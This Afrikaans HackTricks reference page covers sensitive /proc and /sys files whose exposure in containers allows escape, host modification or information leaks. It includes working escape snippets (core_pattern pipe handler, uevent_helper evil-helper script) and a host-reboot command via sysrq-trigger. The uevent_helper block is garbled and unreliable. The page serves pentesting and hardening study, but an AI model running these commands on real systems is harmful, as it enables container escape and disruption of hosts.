# Sensitiewe Monte

{{#include ../../../../banners/hacktricks-training.md}}

Die blootstelling van `/proc` en `/sys` sonder behoorlike naamruimte-isolasie stel beduidende sekuriteitsrisiko's in, insluitend die vergroting van die aanvaloppervlak en inligtingsontsluiting. Hierdie gidse bevat sensitiewe lêers wat, indien verkeerd geconfigureer of deur 'n nie-geautoriseerde gebruiker toegang verkry, kan lei tot houerontvlugting, gasheerwysiging, of inligting kan verskaf wat verdere aanvalle ondersteun. Byvoorbeeld, om `-v /proc:/host/proc` verkeerd te monteer kan AppArmor-beskerming omseil as gevolg van sy pad-gebaseerde aard, wat `/host/proc` onbeskermd laat.

**Jy kan verdere besonderhede van elke potensiële kwesbaarheid vind in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Kwesbaarhede

### `/proc/sys`

Hierdie gids laat toegang toe om kern veranderlikes te wysig, gewoonlik via `sysctl(2)`, en bevat verskeie subgidse van bekommernis:

#### **`/proc/sys/kernel/core_pattern`**

- Beskryf in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Laat toe om 'n program te definieer wat uitgevoer moet word op kernlêer generasie met die eerste 128 bytes as argumente. Dit kan lei tot kode-uitvoering as die lêer met 'n pyp `|` begin.
- **Toets en Exploit Voorbeeld**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Ja # Toets skrywe toegang
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Stel pasgemaakte handler in
sleep 5 && ./crash & # Trigger handler
```

#### **`/proc/sys/kernel/modprobe`**

- Gedetailleerd in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Bevat die pad na die kernmodule-laaier, wat aangeroep word om kernmodules te laai.
- **Kontroleer Toegang Voorbeeld**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Kontroleer toegang tot modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Verwys na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- 'n Globale vlag wat beheer of die kern paniek of die OOM moordenaar aanroep wanneer 'n OOM toestand voorkom.

#### **`/proc/sys/fs`**

- Volgens [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), bevat opsies en inligting oor die lêerstelsel.
- Skrywe toegang kan verskeie ontkenning-van-diens aanvalle teen die gasheer moontlik maak.

#### **`/proc/sys/fs/binfmt_misc`**

- Laat toe om interpreteerders vir nie-inheemse binêre formate te registreer gebaseer op hul magiese nommer.
- Kan lei tot voorregverhoging of wortel-sheltoegang as `/proc/sys/fs/binfmt_misc/register` skryfbaar is.
- Betrokke exploit en verduideliking:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Diepgaande tutoriaal: [Video skakel](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Ander in `/proc`

#### **`/proc/config.gz`**

- Mag die kernkonfigurasie onthul as `CONFIG_IKCONFIG_PROC` geaktiveer is.
- Nuttig vir aanvallers om kwesbaarhede in die lopende kern te identifiseer.

#### **`/proc/sysrq-trigger`**

- Laat toe om Sysrq-opdragte aan te roep, wat moontlik onmiddellike stelselhervattings of ander kritieke aksies kan veroorsaak.
- **Hervatting van Gasheer Voorbeeld**:

```bash
echo b > /proc/sysrq-trigger # Hervat die gasheer
```

#### **`/proc/kmsg`**

- Blootstel kernringbufferboodskappe.
- Kan help in kern exploits, adreslekas, en sensitiewe stelselinligting verskaf.

#### **`/proc/kallsyms`**

- Lys kern uitgevoerde simbole en hul adresse.
- Essensieel vir kern exploit ontwikkeling, veral om KASLR te oorkom.
- Adresinligting is beperk met `kptr_restrict` op `1` of `2` gestel.
- Besonderhede in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfereer met die kern geheue toestel `/dev/mem`.
- Histories kwesbaar vir voorregverhoging aanvalle.
- Meer oor [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Verteenwoordig die stelsel se fisiese geheue in ELF kernformaat.
- Lees kan die gasheer stelsel en ander houers se geheue-inhoud lek.
- Groot lêergrootte kan lei tot leesprobleme of sagtewarekrake.
- Gedetailleerde gebruik in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Alternatiewe interfase vir `/dev/kmem`, wat kern virtuele geheue verteenwoordig.
- Laat lees en skryf toe, dus direkte wysiging van kern geheue.

#### **`/proc/mem`**

- Alternatiewe interfase vir `/dev/mem`, wat fisiese geheue verteenwoordig.
- Laat lees en skryf toe, wysiging van alle geheue vereis die oplos van virtuele na fisiese adresse.

#### **`/proc/sched_debug`**

- Teruggee proses skedulering inligting, wat PID naamruimte beskermings omseil.
- Blootstel prosesname, ID's, en cgroup identifiseerders.

#### **`/proc/[pid]/mountinfo`**

- Verskaf inligting oor monteerpunte in die proses se monteernaamruimte.
- Blootstel die ligging van die houer `rootfs` of beeld.

### `/sys` Kwesbaarhede

#### **`/sys/kernel/uevent_helper`**

- Gebruik vir die hantering van kern toestel `uevents`.
- Skryf na `/sys/kernel/uevent_helper` kan arbitrêre skripte uitvoer wanneer `uevent` triggers plaasvind.
- **Voorbeeld vir Exploit**: %%%bash

#### Skep 'n payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Vind gasheer pad van OverlayFS monteer vir houer

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Stel uevent_helper in op kwaadwillige helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Trigger 'n uevent

echo change > /sys/class/mem/null/uevent

#### Lees die uitvoer

cat /output %%%

#### **`/sys/class/thermal`**

- Beheer temperatuurinstellings, wat moontlik DoS aanvalle of fisiese skade kan veroorsaak.

#### **`/sys/kernel/vmcoreinfo`**

- Lek kern adresse, wat moontlik KASLR in gevaar kan stel.

#### **`/sys/kernel/security`**

- Huisves `securityfs` interfase, wat konfigurasie van Linux Sekuriteitsmodules soos AppArmor toelaat.
- Toegang mag 'n houer in staat stel om sy MAC-stelsel te deaktiveer.

#### **`/sys/firmware/efi/vars` en `/sys/firmware/efi/efivars`**

- Blootstel interfaces vir interaksie met EFI veranderlikes in NVRAM.
- Verkeerde konfigurasie of eksploit kan lei tot gebroke skootrekenaars of onbootbare gasheer masjiene.

#### **`/sys/kernel/debug`**

- `debugfs` bied 'n "geen reëls" debugging interfase aan die kern.
- Geskiedenis van sekuriteitskwessies as gevolg van sy onbeperkte aard.

### Verwysings

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
